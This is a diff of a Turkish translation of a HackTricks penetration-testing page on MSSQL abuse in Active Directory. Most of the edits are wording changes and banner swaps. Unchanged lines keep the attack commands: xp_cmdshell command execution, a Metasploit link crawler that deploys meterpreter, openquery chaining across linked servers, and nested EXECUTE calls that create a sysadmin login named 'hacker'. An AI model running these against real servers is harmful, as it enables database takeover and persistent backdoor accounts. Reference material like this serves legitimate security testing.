@@ -2,17 +2,17 @@
 
 <details>
 
-<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
-* **Bir siber güvenlik şirketinde mi çalışıyorsunuz? Şirketinizin HackTricks'te reklamını görmek ister misiniz? ya da PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
+* **Bir siber güvenlik şirketinde mi çalışıyorsunuz? Şirketinizin HackTricks'te reklamını görmek ister misiniz? Ya da en son PEASS sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'nı kontrol edin!
 * [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) ya da [**telegram grubuna**](https://t.me/peass) katılın ya da beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
-* **Hacking püf noktalarınızı göndererek PR'ler göndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **paylaşın.**
+* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
+* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin**.
+* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile katkıda bulunun**.
 
 </details>
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
@@ -72,7 +72,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL Uzaktan Kod Çalıştırma (RCE)
 
-MSSQL ana bilgisayarında **komutlar çalıştırmak** da mümkün olabilir
+MSSQL ana bilgisayarında **komutlarını** çalıştırmak da mümkün olabilir
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
@@ -85,7 +85,7 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 ## MSSQL Güvenilir Bağlantılar
 
-Bir MSSQL örneği, farklı bir MSSQL örneği tarafından güvenilir olarak kabul ediliyorsa (veritabanı bağlantısı). Kullanıcı, güvenilen veritabanı üzerinde ayrıcalıklara sahipse, **güven ilişkisini kullanarak diğer örnekte de sorguları yürütebilecektir**. Bu güvenler zincirlenebilir ve kullanıcı belirli bir noktada yanlış yapılandırılmış bir veritabanı bulabilir ve komutları yürütebilir.
+Bir MSSQL örneği, farklı bir MSSQL örneği tarafından güvenilir (veritabanı bağlantısı) olarak kabul ediliyorsa ve kullanıcı güvenilir veritabanı üzerinde ayrıcalıklara sahipse, **güven ilişkisini kullanarak diğer örnekte de sorguları yürütebilecektir**. Bu güvenler zincirlenebilir ve kullanıcı belirli bir noktada bazı yanlış yapılandırılmış veritabanları bulabilir ve komutları yürütebilir.
 
 **Veritabanları arasındaki bağlantılar, orman güvenlik ilişkileri üzerinden bile çalışır.**
 
@@ -129,19 +129,17 @@ Metasploit'i kullanarak güvenilir bağlantıları kolayca kontrol edebilirsiniz
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-### Elde Edilebilecek Güvenilir Bağlantıları Bulma
-
-Metasploit'in yalnızca MSSQL'de `openquery()` işlevini kötüye kullanmaya çalışacağını unutmayın (yani, `openquery()` ile komut çalıştıramazsanız komutları çalıştırmak için **manuel olarak** `EXECUTE` yöntemini denemeniz gerekecektir, aşağıya bakınız.)
-
-### Manuel - Openquery()
+### El ile - Openquery()
 
 **Linux** üzerinden **sqsh** ve **mssqlclient.py** kullanarak bir MSSQL konsol kabuğu elde edebilirsiniz.
 
-**Windows** üzerinden ayrıca [**HeidiSQL**](https://www.heidisql.com) gibi bir **MSSQL istemcisi** kullanarak bağlantıları bulabilir ve komutları manuel olarak çalıştırabilirsiniz.
+**Windows** üzerinden [**HeidiSQL**](https://www.heidisql.com) gibi bir **MSSQL istemcisi** kullanarak bağlantıları bulabilir ve komutları el ile çalıştırabilirsiniz.
 
-_Windows kimlik doğrulaması kullanarak giriş yapma:_
+_Windows kimlik doğrulaması kullanarak giriş yapın:_
 
-![](<../../.gitbook/assets/image (805).png>)
+![](<../../.gitbook/assets/image (805).png>) 
+
+#### Güvenilir Bağlantıları Bulun
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
@@ -150,7 +148,7 @@ EXEC sp_linkedservers;
 
 #### Güvenilir bağlantıda sorguları yürüt
 
-Bağlantı aracılığıyla sorguları yürüt (örnek: yeni erişilebilir örnekte daha fazla bağlantı bulun):
+Bağlantı üzerinden sorguları yürüt (örnek: yeni erişilebilir örnekte daha fazla bağlantı bulun):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
@@ -170,9 +168,11 @@ SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", '
 ```
 ### Kılavuz - EXECUTE
 
-`openquery()` içerisinden `exec xp_cmdshell` gibi eylemleri gerçekleştiremiyorsanız `EXECUTE` yöntemini deneyin.
+`openquery()` içerisinde `exec xp_cmdshell` gibi eylemleri gerçekleştiremiyorsanız `EXECUTE` yöntemini deneyin.
 
-Trusted bağlantıları da `EXECUTE` kullanarak kötüye kullanabilirsiniz:
+### Manuel - EXECUTE
+
+Güvenilir bağlantıları kötüye kullanabilirsiniz:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -182,22 +182,23 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 **MSSQL yerel kullanıcısı** genellikle **`SeImpersonatePrivilege`** adı verilen özel bir ayrıcalığa sahiptir. Bu, hesabın "kimlik doğrulamadan sonra bir istemciyi taklit etmesine" olanak tanır.
 
-Birçok yazarın ortaya koyduğu bir strateji, bir SİSTEM hizmetini, saldırganın oluşturduğu sahte veya ara hizmete kimlik doğrulamaya zorlamaktır. Bu sahte hizmet, SİSTEM hizmetini kimlik doğrulamaya çalışırken taklit edebilir.
+Birçok yazarın ortaya koyduğu bir strateji, bir SİSTEM hizmetini, saldırganın oluşturduğu bir sahte veya ara hizmete kimlik doğrulamaya zorlamaktır. Bu sahte hizmet, SİSTEM hizmetini kimlik doğrulamaya çalışırken taklit edebilir.
 
 [SweetPotato](https://github.com/CCob/SweetPotato), bu çeşitli tekniklerin bir koleksiyonuna sahiptir ve bunlar Beacon'ın `execute-assembly` komutu aracılığıyla yürütülebilir.
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 <details>
 
-<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Sıfırdan kahraman olacak şekilde AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* **Bir **cybersecurity şirketinde mi çalışıyorsunuz? **HackTricks'te şirketinizin reklamını görmek ister misiniz**? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz**? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **Bir **cybersecurity şirketinde mi çalışıyorsunuz**? **Şirketinizi HackTricks'te reklamını görmek ister misiniz**? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz**? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
 * [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
-* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile katkıda bulunun.**
+* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin**.
+* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **takip edin**.
 
 </details>
